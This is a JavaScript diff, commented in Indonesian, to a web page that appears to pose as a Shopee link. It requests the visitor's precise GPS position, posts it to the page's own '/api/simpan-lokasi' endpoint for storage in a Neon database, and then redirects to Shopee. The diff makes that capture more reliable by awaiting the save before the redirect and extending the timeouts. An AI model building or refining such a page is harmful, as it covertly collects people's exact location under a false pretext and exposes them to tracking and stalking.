@@ -72,36 +72,33 @@
         }
       }
 
-      // Waktu batas maksimal tunggu (8 detik) sebelum memaksa redirect
+      // Waktu batas maksimal tunggu (10 detik) sebelum memaksa redirect jika koneksi lambat
       let maxWaitTimer = setTimeout(() => {
         alihkanKeShopee();
-      }, 8000);
+      }, 10000);
 
-      function kirimLokasiKeServer(dataGPS) {
-        updateStatus("Menghubungkan...");
-        fetch("/api/simpan-lokasi", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(dataGPS),
-        })
-          .then((res) => {
-            if (!res.ok) throw new Error("Respon server bermasalah");
-            return res.json();
-          })
-          .then((data) => {
-            console.log("Lokasi tersimpan ke database Neon:", data);
-          })
-          .catch((err) => {
-            console.error("Gagal mengirim data ke server:", err);
-          })
-          .finally(() => {
-            clearTimeout(maxWaitTimer);
-            alihkanKeShopee();
+      async function kirimLokasiKeServer(dataGPS) {
+        updateStatus("Menyimpan data...");
+        try {
+          // Gunakan await agar browser benar-benar menunggu proses simpan ke Neon
+          const response = await fetch("/api/simpan-lokasi", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(dataGPS),
           });
+
+          const resData = await response.json();
+          console.log("Respon Server:", resData);
+        } catch (err) {
+          console.error("Gagal mengirim data ke server:", err);
+        } finally {
+          // Batalkan timer darurat dan alihkan halaman setelah simpan selesai
+          clearTimeout(maxWaitTimer);
+          alihkanKeShopee();
+        }
       }
 
       window.onload = function () {
-        // Cek apakah akses menggunakan HTTPS (diperlukan oleh browser modern)
         if (
           location.protocol !== "https:" &&
           location.hostname !== "localhost"
@@ -134,12 +131,11 @@
               }
               console.warn(infoError);
               clearTimeout(maxWaitTimer);
-              // Beri jeda singkat sebelum pengalihan jika terjadi kegagalan
               setTimeout(alihkanKeShopee, 1000);
             },
             {
               enableHighAccuracy: true,
-              timeout: 6000,
+              timeout: 7000,
               maximumAge: 0,
             },
           );
